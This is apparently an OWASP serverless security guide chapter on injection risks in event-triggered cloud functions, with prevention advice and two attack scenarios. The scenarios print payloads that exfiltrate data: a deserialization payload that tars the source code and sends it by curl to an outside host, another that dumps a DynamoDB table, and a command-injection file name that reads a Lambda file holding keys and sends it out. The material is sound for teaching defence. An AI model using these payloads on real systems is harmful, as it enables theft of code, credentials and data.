# A1:2017 Injection

## Attack Vectors
Attack vectors for injections in traditional applications are usually referred to any location where the input to the application can be controlled or manipulated by the attacker. However, in serverless applications the attack surface increases.

Since serverless functions can also be triggered from different events sources like cloud storage events (S3, Blob and other cloud storage), Stream data processing (e.g. AWS Kinesis), databases changes (e.g. DynamoDB, CosmosDB), code modifications (e.g. AWS CodeCommit) notifications (e.g. SMS, Emails, IoT) and more, we should no longer consider input coming directly from the API calls as the sole attack surface. 

Moreover, we no longer have control of the line between the origin to the resource. If a function is triggered via email or a database, there is nowhere to put a Firewall or any other control that will validate the event.

## Security Weakness
The traditional SQL/NoSQL Injection will be the same. OS Command Injection might not target the files in the container (e.g. /etc/host), but source code and other secrets could be found in the container. Code injection will allow an attacker to use the provider’s API to scan and interact with other services in the account.

## Impact
The impact of a successful injection attack will lean on the permission the vulnerable function has. If the function has been assigned a role that grants it liberal access to a cloud storage, then injected code could delete data, upload corrupted data, etc. If the function has been granted access to a database table, it could delete records, insert records, etc. Roles that allow creating users and permissions can eventually lead into a cloud account takeover.

## How to Prevent
- Never trust, pass or make any assumptions regarding input and its validity from any resource
- Use a safe API, which avoids the use of the interpreter entirely or provides a parameterized interface, or migrate to use Object Relational Mapping Tools (ORMs)
- Use positive or “whitelist” input validation when possible
- Identify trusted sources and resources and whitelist them, if possible
- For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter
- Consider all event types and entry points into the system
- Run functions with the least privileges required to perform the task to reduce attack surface
- Use a commercial runtime defense solution to protect functions on execution time

## Example Attack Scenario I
The following function code, repeatedly found in the wild, deserializes data using the eval() function:
<image>

The untrusted input is sent from the trigger’s event to the unserialize function without any validation. By sending the following payload, attackers can steal the source code of the function, simply by creating a new child_proccess that will zip the source-code found in the current directory, wrapping it up with base64 and sending it to any server they have access to:
>
    _$$ND_FUNC$$_function(){require("child_process").exec("tar -pcvzf /tmp/source.tar.gz ./;
    b=`base64 --wrap=0 /tmp/source.tar.gz`; curl -X POST https://serverless.fail/ --data
    $b",function(){});}()

The attacker can now investigate the code and use it to create a more cloud-native attack. For example, using the provider’s API to read from the database:
>
    _$$ND_FUNC$$_function(){var s=require("aws-sdk");var h=require("https"); var d=new
    s.DynamoDB.DocumentClient;d.scan({TableName:process.env.DYNAMODB_TABLE},function(e,a)
    {if(e);else{var t=Buffer.from(JSON.stringify(a)).toString();;var
    h.get(“https://serverless.fail?encodeURI(t)”),function(e){})}});}()

## Example Attack Scenario II
A function is triggered from a storage file upload. The function then downloads the file and processes it.

<image> 

However, the the function is vulnerable to command injection, in case a downloaded file does not end with the required file extension (i.e. ​ .jpg ​ ).

To exploit that, an attacker uses the application legitimately, but uploads two files. One of them contains a command injection syntax in its name:
>
    chip.gif c.jpg;cd ..; cd var;cd task;f=`head -50 lambda_function.py|base64 --wrap=0`;curl
    protego.ngrok.io?l="$f"
<iamge>

To exploit this vulnerability, the attacker needed to:

- Address an existing file (i.e. chip.gif, which he himself uploaded before)
- Exit the /tmp folder
- Enter the /var/task folder (Use of '/' in the object name is not allowed)
- Read the first 50 lines of lambda_function.py and with it the hardcoded keys to the management AWS account
- Wrap the code in base64
- Send it to a destination held by the attacker

As a result of the Lambda execution, a request is sent to the attacker, containing the function’s code:
<image>
<image>

## Serverless Risk Meter
Injection attacks are always a great risk. One major benefit is that serverless APIs are harder for attackers to scan than traditional HTTP apps, which raises the bar dramatically for automated attacks. However, knowing that 99% of possible malicious inputs are coming from API calls in traditional server applications, allowing us to put all our guard there, makes it at least more predictable. The increase in attack surface, results in a major security concern in serverless applications.
<image>